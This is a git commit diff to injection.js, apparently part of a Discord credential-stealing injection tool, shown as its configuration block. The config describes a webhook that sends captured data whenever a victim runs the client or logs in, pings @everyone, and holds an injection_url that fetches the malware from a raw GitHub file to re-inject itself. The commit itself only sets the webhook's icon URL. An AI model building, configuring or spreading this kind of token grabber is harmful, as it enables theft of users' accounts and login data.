af4c7ae28595b476511d4333e8681bf9e5e21854
Mike Hok <84112230+griefxbl@users.noreply.github.com>
2022-11-25 17:56:04 -0500

    Update injection.js

--- injection.js
+++ injection.js
@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: 'asdasdas', //name of the webhook thats gonna send the info
-  embed_icon: ''.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_icon: 'https://images-ext-1.discordapp.net/external/iOOKYWYr7e58-lIUTM241jOjBeCViyU9KT3Rffcv13U/https/discord.com/assets/1f0bfc0865d324c2587920a7d80c609b.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 5639644, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   injection_url: 'https://raw.githubusercontent.com/griefxbl/Stringless/main/injection.js', //injection url for when it reinjects
   /**
